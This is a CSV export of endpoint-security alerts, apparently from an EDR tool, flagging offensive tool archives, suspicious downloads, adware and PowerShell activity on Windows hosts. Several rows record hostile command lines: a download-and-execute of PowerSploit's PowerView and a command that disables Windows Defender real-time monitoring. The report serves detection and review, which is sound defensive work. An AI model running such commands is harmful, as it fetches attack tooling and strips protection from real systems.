Hostname,OS_Version,Severity,Confidence,Tactic,Technique,Description,Process_Name,Process_Path,Command_Line,User_Name,Parent_Process,Parent_Command_Line,Files_Accessed,Files_Written,IOCs,Network_Accesses,SHA256,MD5
****,Windows 10,High,80,Defense Evasion,Masquerading,"A process has written a suspicious file to disk. Adversaries may write a malicious file to a commonly trusted directory, use a benign name, or a mismatched file extension. This is done for the sake of evading defenses and observation. Check the activity and surrounding events are expected in your environment.",WinRAR.exe,\Device\HarddiskVolume3\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" x -iext -ver -imon1 -- ""C:\Users\Admin\Desktop\malwattevalley11.zip"" C:\Users\Admin\Desktop\",****,explorer.exe,C:\windows\Explorer.EXE,dcomexec.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);goldenPac.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);ntfs-read.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);dpapi.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);keylistattack.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);ntlmrelayx.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);Get-GPPPassword.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);esentutl.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);ping.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);GetADUsers.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin),GetADUsers.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);dacledit.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);goldenPac.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);psexec.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);raiseChild.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);rbcd.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);getPac.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);DumpNTLMInfo.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);mimikatz.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);describeTicket.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__),,,a7814203d7a5124fda5c48e02c2856694d584f458f00bb695d63b61d9c3f9005,a40c46ea3459f9ac799e87b1945710f1
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849 (\Device\HarddiskVolume7\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",chrome.exe,\Device\HarddiskVolume7\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,page_embed_script.js (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.92.1_0);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted);offscreendocument_main.js (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.92.1_0);page_embed_script.js (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.92.1_0);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted);offscreendocument.html (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.92.1_0);js.js (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\js);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849.exe (\Device\HarddiskVolume7\Users\mdwis\Downloads),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,224.0.0.251:5353 (UDP);ff02:0:0:0:0:0:0:fb:5353 (UDP),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,4ea241a2565eeee33cb13f995bc81a02
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849 (\Device\HarddiskVolume7\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,80,Execution,PowerShell,A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine),PowerView.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando),"iex(iwr(""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1""))",185.199.110.133:443 (TCP),3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Medium,80,Execution,PowerShell,A PowerShell script related to this process is likely malicious or shares characteristics with known malicious scripts. Review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine),PowerView.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando),"iex(iwr(""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1""))",185.199.110.133:443 (TCP),3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,PowerShell,A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine),PowerView.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando),Set-MpPreference -DisableRealtimeMonitoring $true,185.199.110.133:443 (TCP),3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Medium,80,Execution,PowerShell,A PowerShell script related to this process is likely malicious or shares characteristics with known malicious scripts. Review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine),PowerView.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando),Set-MpPreference -DisableRealtimeMonitoring $true,185.199.110.133:443 (TCP),3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Low,100,Malware,PUP,This file is classified as Adware/PUP based on its SHA256 hash.,ipscan-3.9.1-setup.exe,\Device\HarddiskVolume7\Users\mdwis\Downloads\ipscan-3.9.1-setup.exe,"""C:\Users\mdwis\Downloads\ipscan-3.9.1-setup.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,,892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,,892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,Low,100,Malware,PUP,A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.,msedge.exe,\Device\HarddiskVolume7\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --always-read-main-dll --field-trial-handle=2224,i,14317981040131843377,15210902797678255994,262144 --variations-seed-version --mojo-platform-channel-handle=2476 /prefetch:11",****,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --single-argument microsoft-edge:?url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3Dangry%2Bip%2Bscanner%26form%3DWSBEDG%26qs%3DLT%26cvid%3D26a3753cf2bf46cd90553a000b7a397b%26pq%3Dangry%26cc%3DLK%26setlang%3Den-US%26nclid%3DE4A68D2F4BF55F080B5F5842E2A3D265%26ts%3D1748337130412%26nclidts%3D1748337130%26tsms%3D412%26wsso%3DModerate&timestamp=1748337130416&source=WindowsSearchBox&campaign=addedgeprot&medium=AutoSuggest&oid=u%3A430fae35-d39b-4855-a08b-355c3c882b07.44e3cf94-19c9-4e32-96c3-14f5bf01391a&upn=it20614294%40my.sliit.lk",,f_00039f (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Microsoft\Edge\User Data\Profile 1\Cache\Cache_Data),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,23.202.229.23:443 (TCP);216.239.36.178:443 (UDP);185.199.109.153:443 (TCP);4.241.155.66:443 (TCP);23.50.232.83:443 (TCP);13.107.253.59:443 (TCP);150.171.28.10:443 (TCP);13.107.246.59:443 (TCP);13.107.42.16:443 (TCP);150.171.28.11:80 (TCP),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
